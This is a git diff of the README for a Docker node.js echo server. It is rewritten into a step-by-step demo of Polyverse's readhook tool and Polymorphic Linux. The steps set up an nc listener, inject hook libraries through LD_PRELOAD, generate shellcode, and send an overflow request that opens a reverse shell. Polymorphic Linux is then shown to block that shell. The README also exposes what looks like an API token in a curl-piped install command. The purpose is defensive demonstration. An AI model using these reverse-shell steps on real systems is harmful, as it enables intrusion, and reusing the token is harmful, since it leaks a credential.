@@ -1,61 +1,96 @@
 # node-echo-server
-Docker node.js echo-server repository.
+Simple node-based echo server
 
-## Running
+## Start
 ```
-./run.sh
-# OR
 docker run -d --rm --name echo -p 8080:8080 polyverse/node-echo-server
 ```
-## Stopping
+
+## Stop
 ```
 docker kill echo
 ```
-## Running interactively (equivalent to automated running described above).
+
+## Interact
 ```
 docker run -it --rm --name echo -p 8080:8080 polyverse/node-echo-server /bin/sh
-
 node echo-server.js
 ```
-# Using node-echo-server to demonstrate readhook.
-(Note: In the following steps, you will need to have a listener running that the reverse-shell will try to connect to. On a Mac, this can look like this:
+---
+# Polyverse Polymorphic Linux
+
+## 1 Setup Listener for Reverse Shell
+
+### 1.1: Shell-1: Start a listener for the remote shell to connect to
 ```
-nc -l 5555
+nc -kl 5555
 ```
-## Running interactively w/readhook
-The following commands add and then run with readhook.
+
+## 2: Start Server and install readhook
+
+### 2.1: Shell-2: Start the container with an interactive shell
 ```
 docker run -it --rm --name echo -p 8080:8080 polyverse/node-echo-server /bin/sh
+```
 
+### 2.2: Shell-2: Install readhook
+```
 apk update && apk add curl wget ca-certificates && update-ca-certificates
-
 wget -q -O /tmp/basehook.so https://github.com/polyverse/readhook/releases/download/jenkins/basehook.so
 wget -q -O /tmp/fullhook.so https://github.com/polyverse/readhook/releases/download/jenkins/fullhook.so
+```
 
-LD_PRELOAD="/tmp/fullhook.so /tmp/basehook.so" node echo-server.js
+### 2.3: Shell-2: Run the echo-server with readhook in front of libc
 ```
-### With the above running container,
-a) Generate a payload (e.g. curl localhost:8080/xyzzxMAKELOAD<ip-address><:port>)
-b) Pass the payload back to confirm that it creates a reverse shell to the listener.
+LD_PRELOAD="/tmp/fullhook.so /tmp/basehook.so" node /src/echo-server.js
 ```
-curl localhost:8080/xyzzxMAKELOADdocker.for.mac.localhost:5555
-# <Save this output. It is the payload that will work in OVERFLOW>
 
-curl localhost:8080/xyzzyOVERFLOW<...the rest of the saved output from above.>
-# <Check your listener. It should have a reverse shell to the container.>
+### 2.3: Shell-3: Test that the echo-server is running as expected
 ```
-## Running interactively w/readhook and Polyverse Polymorphic Linux
+curl localhost:8080/echo-this-line-of-text
+echo-this-line-of-text
 ```
-docker run -it --rm --name echo -p 8080:8080 polyverse/node-echo-server /bin/sh
 
+## 3: Generate Shell-Code
+
+### 3.1: Shell-3: Generate the shell-code needed to "phone-home" to the listener on Shell-1
+```
+export shellCode=$(curl localhost:8080/xyzzxMAKELOADdocker.for.mac.localhost:5555)
+```
+
+### 3.2: Shell-3: Send the shell-code to the OVERFLOW endpoint to check that it works.
+```
+curl localhost:8080/$shellCode
+```
+
+### 3.3: Shell-1: Check that the overflow resulted in a remote shell
+```
+ls && whoami && exit
+```
+
+## 4: Install Polyverse Polymorphic Linux
+
+### 4.1: Shell-2: Add curl and Polyverse Distros
+```
 apk update && apk add curl wget ca-certificates && update-ca-certificates
-
-wget -q -O /tmp/basehook.so https://github.com/polyverse/readhook/releases/download/jenkins/basehook.so
-
-curl https://repo.polyverse.io/install.sh | sh -s <your-api-token>
-
-sed -n -i '/repo.polyverse.io/p' /etc/apk/repositories && apk upgrade --update-cache --available
-
-LD_PRELOAD=/tmp/basehook.so node echo-server.js
+curl https://repo.polyverse.io/install.sh | sh -s vZ2v3Bo4Kbnwj9pECrLsoGDDo
 ```
-### Repeat Step b (from above) and confirm that it _does not_ create a reverse shell when Polyverse Polymorphic Linux is installed.
+
+### 4.2: Shell-2: Update packages with Polymorphic Linux packages
+```
+sed -n -i '/repo.polyverse.io/p' /etc/apk/repositories && apk upgrade --update-cache --available
+```
+
+### 4.3: Shell-2: Re-run the echo-server with basehook.so (only)
+
+LD_PRELOAD=/tmp/basehook.so node /src/echo-server.js
+```
+
+### 4.4: Shell-3: Test the shell-code with Polymorphic Linux
+```
+curl localhost:8080/$shellCode
+```
+
+### 4.5: Shell 1: Confirm that nobody phoned-home to the listener
+
+### 4.6: Shell 2: Confirm that node terminated abnormally
